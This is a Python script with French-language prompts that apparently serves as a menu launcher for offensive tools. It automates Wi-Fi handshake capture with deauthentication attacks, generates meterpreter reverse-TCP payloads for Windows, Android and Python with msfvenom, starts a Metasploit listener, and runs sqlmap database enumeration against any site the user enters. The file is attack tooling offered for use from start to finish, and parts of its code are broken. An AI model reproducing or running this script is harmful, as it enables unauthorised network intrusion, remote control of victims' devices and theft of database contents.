import os
import time

options = ["1 : crack wifi ", "2 : Creer un payload ",  "3 : lancer un listener", "4 :sqlmap"]
i = 0
while i != 4:
    print(options[i])
    i += 1
choice = str(input("Quel nombre: "))
if choice == "0":
    print("salut")
elif choice == "1":
    print("Entrer le nom de votre interface : ")
    interface = str(input("Entrer le nom de l'interface reseau : "))
    os.system("sudo airmon-ng start " + interface)
    print("des que vous voyez votre reseau appuyer sur ctrl c ")
    time.sleep(2)
    os.system("sudo airodump-ng wlan0mon")
    bssid = input("entre le bssid : ")
    channel = input("Entrer le channel : ")
    print("Retenez un client faites :")
    time.sleep(2)
    os.system("sudo airodump-ng -c " + channel + " --bssid " + bssid + " wlan0mon ")
    time.sleep(2)
    os.system("sudo airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon &")
    station = str(input("Entrer le nom de la station"))
    # os.system("xterm -hold -e 'aireplay-ng -0 1 -a " + bssid + " -c " + station + " wlan0mon' ")
    os.system("gnome-terminal -e 'bash -c \aireplay-ng -0 1 -a " + bssid + " -c " + station + " wlan0mon; bash' ")

        # os.system("sudo nohup airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon &")
        # station = input("Entrer la station : ")
        # os.system("xterm  -e 'sudo aireplay-ng -0 15 -a " + bssid + " -c " + station + " wlan0mon' ")
    print("Le handshake a ete capturee pour le cracker utiliser la commande ")

elif choice == "2":
    print("1 : windows ")
    print("2 : android ")
    print("3 : python ")
    pay = input("Quel system : ")
    if pay == "1":
        lhost = input("Entre le lhost : ")
        lport = input("Entrer le lport : ")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.exe")
    elif pay == "2":
        lhost = input("Entre le lhost : ")
        lport = input("Entrer le lport : ")
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.apk")
    elif pay == "3":
        lhost = input("Entre le lhost : ")
        lport = input("Entrer le lport : ")
        os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > dan.py")


elif choice == "3":
    lhost = input("Entre le lhost : ")
    lport = input("Entrer le lport : ")
    print("1 : windows ")
    print("2 : android ")
    print("3 : python ")
    file = open("msf.txt", "w+")
    file.write("use exploit/multi/handler\n")
    file.write("set lhost " + lhost + "\n")
    file.write("set lport " + lport + "\n")
    pay = input("Quel system : ")
    if pay == "1":
        file.write("set payload windows/meterpreter/reverse_tcp" + "\n")
    elif pay == "2":
        file.write("set payload android/meterpreter/reverse_tcp" + "\n")
    elif pay == "3":
        file.write("set payload python/meterpreter/reverse_tcp" + "\n")
        file.write("run" + "\n")
        file.close()
        os.system("msfconsole -r msf.txt")

elif choice == "4":
    site = input("quel est le nom du site ? : ")
    os.system("sqlmap -u " + site + " --dbs")
else:
    print("erreur veuliiez ressayer")
    os.system("echo pas repertorie")

